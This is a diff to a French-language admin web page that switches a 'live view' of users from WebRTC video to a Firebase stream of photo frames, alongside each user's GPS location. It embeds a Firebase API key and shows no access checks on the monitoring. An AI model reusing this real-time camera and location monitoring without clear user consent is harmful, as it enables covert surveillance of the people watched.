@@ -61,13 +61,14 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            background: #000;
         }
 
-        video {
+        .live-viewer img {
             width: 100%;
+            height: auto;
             background: black;
-            max-height: 60vh;
-            display: block;
+            display: none;
         }
 
         .controls {
@@ -148,10 +149,10 @@
             overflow-y: auto;
         }
 
-        .no-video-overlay {
-            position: absolute;
+        .placeholder-text {
             color: white;
             text-align: center;
+            position: absolute;
             pointer-events: none;
         }
     </style>
@@ -160,7 +161,7 @@
     <div class="container">
         <div class="header">
             <h1>🎥 Administration - Live View</h1>
-            <p>Visualisation en temps réel des utilisateurs</p>
+            <p>Visualisation en temps réel (flux photo en continu)</p>
         </div>
 
         <div class="user-selector">
@@ -173,16 +174,15 @@
         <div id="userInfo" class="user-info"></div>
 
         <div class="live-viewer" id="liveViewer">
-            <video id="remoteVideo" autoplay playsinline muted></video>
-            <div id="noVideoOverlay" class="no-video-overlay" style="display: none;">
-                📭 En attente du flux vidéo...
-            </div>
+            <img id="liveImage" alt="Flux vidéo">
+            <div class="placeholder-text" id="placeholder">📭 En attente du flux...</div>
         </div>
 
         <div class="controls">
-            <button id="connectBtn" class="btn-primary">🔗 Se connecter</button>
-            <button id="disconnectBtn" class="btn-danger" disabled>⏹️ Déconnecter</button>
+            <button id="connectBtn" class="btn-primary">🔗 Activer le live</button>
+            <button id="disconnectBtn" class="btn-danger" disabled>⏹️ Désactiver</button>
             <button id="fullscreenBtn" class="fullscreen-btn" disabled>🖥️ Plein écran</button>
+            <button id="debugBtn" style="background:#475569;">🐛 Debug</button>
         </div>
 
         <div id="status" class="status">
@@ -193,7 +193,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getDatabase, ref, onValue, push, get, set } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
@@ -209,30 +209,27 @@
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        let peerConnection = null;
         let currentUserId = null;
+        let frameListener = null;
 
-        const remoteVideo = document.getElementById('remoteVideo');
+        const liveImage = document.getElementById('liveImage');
+        const placeholder = document.getElementById('placeholder');
         const connectBtn = document.getElementById('connectBtn');
         const disconnectBtn = document.getElementById('disconnectBtn');
         const fullscreenBtn = document.getElementById('fullscreenBtn');
+        const debugBtn = document.getElementById('debugBtn');
         const statusDiv = document.getElementById('status');
         const connectionLog = document.getElementById('connectionLog');
         const userSelect = document.getElementById('userSelect');
         const userInfoDiv = document.getElementById('userInfo');
-        const noVideoOverlay = document.getElementById('noVideoOverlay');
 
-        const configuration = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' },
-                { urls: 'stun:stun2.l.google.com:19302' }
-            ]
-        };
+        let frameCount = 0;
+        let lastFpsUpdate = Date.now();
 
         function addLog(message) {
             const time = new Date().toLocaleTimeString();
             connectionLog.innerHTML = `[${time}] ${message}<br>` + connectionLog.innerHTML;
+            console.log(`[${time}] ${message}`);
         }
 
         function setStatus(message, isLive = false) {
@@ -254,7 +251,7 @@
                 
                 if (users) {
                     Object.keys(users).forEach(userId => {
-                        if (users[userId].active && users[userId].active === true) {
+                        if (users[userId].active === true) {
                             userSelect.innerHTML += `<option value="${userId}">👤 Utilisateur #${userId.slice(-6)} (Actif)</option>`;
                         }
                     });
@@ -266,7 +263,7 @@
             });
         }
 
-        // Charger les infos utilisateur
+        // Charger les infos GPS
         function loadUserInfo(userId) {
             const locationRef = ref(database, `users/${userId}/location`);
             onValue(locationRef, (snapshot) => {
@@ -289,150 +286,86 @@
             });
         }
 
-        async function connectToUser() {
+        // Connexion au flux d'images
+        function connectToUser() {
             currentUserId = userSelect.value;
             if (!currentUserId) {
                 setStatus("⚠️ Sélectionnez un utilisateur d'abord");
                 return;
             }
 
-            setStatus("🔄 Connexion à l'utilisateur...");
+            setStatus("🔄 Connexion au flux d'images...");
             connectBtn.disabled = true;
-            addLog("🔍 Recherche de l'offre utilisateur...");
             
-            // Cacher l'overlay
-            noVideoOverlay.style.display = 'block';
+            addLog(`📡 Connexion à l'utilisateur: ${currentUserId}`);
             
-            try {
-                // Récupérer l'offre de l'utilisateur
-                const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
-                const offerSnapshot = await get(offerRef);
-                const offer = offerSnapshot.val();
-                
-                if (!offer) {
-                    setStatus("❌ Aucune offre trouvée");
-                    addLog("❌ Aucune offre trouvée");
-                    connectBtn.disabled = false;
-                    return;
-                }
-                
-                addLog("✅ Offre trouvée, création de la connexion...");
-                
-                // Créer la connexion
-                peerConnection = new RTCPeerConnection(configuration);
-                
-                // Suivi de l'état de la connexion
-                peerConnection.onconnectionstatechange = () => {
-                    addLog(`État connexion: ${peerConnection.connectionState}`);
-                    if (peerConnection.connectionState === 'connected') {
-                        setStatus("🔴 LIVE - Visualisation en cours", true);
+            // Réinitialiser le compteur
+            frameCount = 0;
+            lastFpsUpdate = Date.now();
+            
+            // Écouter les frames sur Firebase
+            const frameRef = ref(database, `live/${currentUserId}/frame`);
+            
+            frameListener = onValue(frameRef, (snapshot) => {
+                const frame = snapshot.val();
+                if (frame && frame.image) {
+                    // Afficher l'image
+                    liveImage.src = frame.image;
+                    
+                    if (liveImage.style.display === 'none') {
+                        liveImage.style.display = 'block';
+                        placeholder.style.display = 'none';
+                        setStatus("🔴 LIVE - Flux de photos reçu", true);
                         fullscreenBtn.disabled = false;
-                        noVideoOverlay.style.display = 'none';
-                    } else if (peerConnection.connectionState === 'failed') {
-                        setStatus("❌ Connexion échouée");
-                        addLog("❌ Échec de la connexion");
+                        addLog("✅ Première image reçue avec succès !");
                     }
-                };
-                
-                peerConnection.oniceconnectionstatechange = () => {
-                    addLog(`État ICE: ${peerConnection.iceConnectionState}`);
-                };
-                
-                // Gérer les tracks entrants (VIDÉO + AUDIO)
-                peerConnection.ontrack = (event) => {
-                    addLog(`📡 Track reçu: ${event.track.kind}`);
-                    if (remoteVideo.srcObject !== event.streams[0]) {
-                        remoteVideo.srcObject = event.streams[0];
-                        addLog("✅ Flux vidéo/audio attaché au vidéo tag !");
-                        
-                        // Forcer la lecture
-                        remoteVideo.play().catch(e => console.log("Erreur play:", e));
-                        
-                        // Masquer l'overlay
-                        noVideoOverlay.style.display = 'none';
+                    
+                    // Calculer les FPS
+                    frameCount++;
+                    const now = Date.now();
+                    if (now - lastFpsUpdate >= 1000) {
+                        const fps = frameCount;
+                        addLog(`📊 FPS: ${fps} images/seconde`);
+                        frameCount = 0;
+                        lastFpsUpdate = now;
+                        setStatus(`🔴 LIVE - ${fps} fps`, true);
                     }
-                };
-                
-                // S'assurer que la vidéo se lance
-                remoteVideo.onloadedmetadata = () => {
-                    addLog("🎬 Métadonnées chargées, lecture");
-                    remoteVideo.play().catch(e => console.log(e));
-                };
-                
-                remoteVideo.oncanplay = () => {
-                    addLog("🎬 La vidéo peut être lue");
-                    remoteVideo.play().catch(e => console.log(e));
-                };
-                
-                // Définir l'offre
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-                addLog("📝 Offre définie");
-                
-                // Créer la réponse
-                const answer = await peerConnection.createAnswer();
-                await peerConnection.setLocalDescription(answer);
-                addLog("📝 Réponse créée");
-                
-                // Envoyer la réponse
-                const answerRef = ref(database, `webrtc/${currentUserId}/answer`);
-                await set(answerRef, {
-                    sdp: answer.sdp,
-                    type: answer.type,
-                    timestamp: Date.now()
-                });
-                addLog("📤 Réponse envoyée");
-                
-                // Gérer les candidats ICE locaux
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
-                        push(candidateRef, event.candidate);
-                        addLog("📡 Candidat ICE envoyé");
-                    }
-                };
-                
-                // Récupérer les candidats ICE de l'utilisateur
-                const candidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
-                onValue(candidatesRef, (snapshot) => {
-                    const candidates = snapshot.val();
-                    if (candidates && peerConnection) {
-                        Object.values(candidates).forEach(candidate => {
-                            try {
-                                peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-                                addLog("✅ Candidat ICE utilisateur ajouté");
-                            } catch(e) {
-                                addLog(`❌ Erreur ICE: ${e.message}`);
-                            }
-                        });
-                    }
-                });
-                
-                disconnectBtn.disabled = false;
-                loadUserInfo(currentUserId);
-                
-            } catch (error) {
-                console.error("Erreur:", error);
-                setStatus("❌ Erreur: " + error.message);
-                addLog(`❌ Erreur: ${error.message}`);
-                connectBtn.disabled = false;
-            }
+                } else {
+                    addLog("⚠️ En attente d'image...");
+                }
+            });
+            
+            loadUserInfo(currentUserId);
+            disconnectBtn.disabled = false;
+            
+            // Timeout si aucune image après 5 secondes
+            setTimeout(() => {
+                if (liveImage.style.display === 'none') {
+                    addLog("❌ Aucune image reçue après 5 secondes");
+                    setStatus("⚠️ Aucun flux - L'utilisateur a-t-il démarré le partage ?");
+                }
+            }, 5000);
         }
 
         function disconnect() {
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
+            addLog("🔌 Déconnexion...");
+            
+            if (frameListener) {
+                off(frameListener);
+                frameListener = null;
             }
             
-            remoteVideo.srcObject = null;
-            remoteVideo.pause();
+            liveImage.src = "";
+            liveImage.style.display = 'none';
+            placeholder.style.display = 'block';
             userInfoDiv.style.display = 'none';
+            
             connectBtn.disabled = false;
             disconnectBtn.disabled = true;
             fullscreenBtn.disabled = true;
+            
             setStatus("🔌 Déconnecté");
             addLog("🔌 Déconnecté");
-            noVideoOverlay.style.display = 'block';
         }
 
         function toggleFullscreen() {
@@ -442,22 +375,38 @@
             if (!document.fullscreenElement) {
                 viewer.requestFullscreen().catch(err => {
                     console.error(err);
+                    addLog(`❌ Erreur plein écran: ${err.message}`);
                 });
+                addLog("🖥️ Mode plein écran activé");
             } else {
                 document.exitFullscreen();
+                addLog("🖥️ Mode plein écran désactivé");
             }
+        }
+
+        function debug() {
+            addLog(`=== DEBUG ===`);
+            addLog(`Utilisateur sélectionné: ${currentUserId || 'aucun'}`);
+            addLog(`Image affichée: ${liveImage.style.display}`);
+            addLog(`Source image: ${liveImage.src ? liveImage.src.substring(0, 50) + '...' : 'vide'}`);
+            addLog(`Dimensions image: ${liveImage.naturalWidth}x${liveImage.naturalHeight}`);
+            addLog(`Listener actif: ${frameListener ? 'oui' : 'non'}`);
         }
 
         connectBtn.addEventListener('click', connectToUser);
         disconnectBtn.addEventListener('click', disconnect);
         fullscreenBtn.addEventListener('click', toggleFullscreen);
+        debugBtn.addEventListener('click', debug);
         
         userSelect.addEventListener('change', () => {
-            disconnect();
+            if (frameListener) {
+                disconnect();
+            }
         });
 
         // Charger les utilisateurs au démarrage
         loadUsers();
+        addLog("🚀 Page admin chargée - En attente de sélection utilisateur");
     </script>
 </body>
 </html>
